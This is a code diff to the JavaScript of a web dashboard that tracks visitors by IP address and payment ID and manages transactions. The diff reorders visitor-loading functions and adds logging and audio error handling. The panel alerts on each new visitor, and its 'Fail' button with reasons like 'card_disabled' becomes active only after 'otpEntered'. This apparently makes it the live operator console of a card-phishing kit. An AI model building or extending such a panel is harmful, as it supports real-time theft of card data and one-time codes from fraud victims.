@@ -238,10 +238,6 @@
       notification.textContent = message;
       document.body.appendChild(notification);
       
-      // Play sound
-      const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-alert-quick-chime-766.mp3');
-      audio.play();
-      
       // Auto remove after duration
       setTimeout(() => {
         notification.style.opacity = '0';
@@ -319,6 +315,58 @@
         });
     });
 
+    // Load visitors
+    async function loadVisitors() {
+      try {
+        const response = await fetch('/api/visitors');
+        if (!response.ok) {
+          throw new Error('Failed to load visitors');
+        }
+        
+        const data = await response.json();
+        console.log('Loaded visitors:', data);
+        
+        const visitorsList = document.getElementById('visitors-list');
+        
+        if (!data || data.length === 0) {
+          visitorsList.innerHTML = '<p>No visitors yet</p>';
+          return;
+        }
+        
+        visitorsList.innerHTML = '';
+        data.forEach(visitor => {
+          visitorsMap.set(visitor.pid, visitor);
+          addVisitorToList(visitor, false);
+        });
+      } catch (error) {
+        console.error('Error loading visitors:', error);
+      }
+    }
+    
+    // Add visitor to list
+    function addVisitorToList(visitor, isNew = true) {
+      const visitorsList = document.getElementById('visitors-list');
+      const visitorItem = document.createElement('div');
+      visitorItem.className = 'visitor-item';
+      if (isNew) {
+        visitorItem.style.animation = 'highlight 3s ease-out';
+      }
+      
+      visitorItem.innerHTML = `
+        <span class="visitor-badge">VISITOR</span>
+        <span class="ip-address">${visitor.ip || 'Unknown'}</span>
+        <span>Payment ID: ${visitor.pid}</span>
+        <span class="visitor-time">${visitor.timestamp}</span>
+      `;
+      
+      // Add to beginning of list for new visitors
+      if (isNew) {
+        visitorsList.insertBefore(visitorItem, visitorsList.firstChild);
+      } else {
+        visitorsList.appendChild(visitorItem);
+      }
+    }
+
     // Transactions Handling
     async function loadTransactions() {
       try {
@@ -389,7 +437,7 @@
                     <option value="card_disabled" ${tx.failureReason === 'card_disabled' ? 'selected' : ''}>Card Disabled</option>
                     <option value="invalid_card" ${tx.failureReason === 'invalid_card' ? 'selected' : ''}>Invalid Card</option>
                   </select>
-                  <button onclick="updateStatusWithReason('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}
+             <button onclick="updateStatusWithReason('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}
                     class="fail-btn">
                     Fail
                   </button>
@@ -404,56 +452,6 @@
         console.error('Error loading transactions:', error);
         showMessage('error', 'Failed to load transactions');
         document.getElementById('transactionsLoading').style.display = 'none';
-      }
-    }
-
-    // Load visitors
-    async function loadVisitors() {
-      try {
-        const response = await fetch('/api/visitors');
-        if (!response.ok) {
-          throw new Error('Failed to load visitors');
-        }
-        
-        const data = await response.json();
-        const visitorsList = document.getElementById('visitors-list');
-        
-        if (data.length === 0) {
-          visitorsList.innerHTML = '<p>No visitors yet</p>';
-          return;
-        }
-        
-        visitorsList.innerHTML = '';
-        data.forEach(visitor => {
-          visitorsMap.set(visitor.pid, visitor);
-          addVisitorToList(visitor, false);
-        });
-      } catch (error) {
-        console.error('Error loading visitors:', error);
-      }
-    }
-    
-    // Add visitor to list
-    function addVisitorToList(visitor, isNew = true) {
-      const visitorsList = document.getElementById('visitors-list');
-      const visitorItem = document.createElement('div');
-      visitorItem.className = 'visitor-item';
-      if (isNew) {
-        visitorItem.style.animation = 'highlight 3s ease-out';
-      }
-      
-      visitorItem.innerHTML = `
-        <span class="visitor-badge">VISITOR</span>
-        <span class="ip-address">${visitor.ip || 'Unknown'}</span>
-   <span>Payment ID: ${visitor.pid}</span>
-        <span class="visitor-time">${visitor.timestamp}</span>
-      `;
-      
-      // Add to beginning of list for new visitors
-      if (isNew) {
-        visitorsList.insertBefore(visitorItem, visitorsList.firstChild);
-      } else {
-        visitorsList.appendChild(visitorItem);
       }
     }
 
@@ -628,6 +626,8 @@
     
     // Handle visitor notifications
     socket.on('visitor', (visitor) => {
+      console.log('New visitor detected:', visitor);
+      
       // Add visitor to map
       visitorsMap.set(visitor.pid, visitor);
       
@@ -635,12 +635,12 @@
       addVisitorToList(visitor, true);
       
       // Show notification
-      showNotification(`New visitor from IP: ${visitor.ip}`);
+      showNotification(`New visitor from IP: ${visitor.ip || 'Unknown'}`);
       
       // Play notification sound
       try {
         const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-alert-quick-chime-766.mp3');
-        audio.play();
+        audio.play().catch(e => console.log('Audio play failed:', e));
       } catch (e) {
         console.log('Could not play notification sound', e);
       }
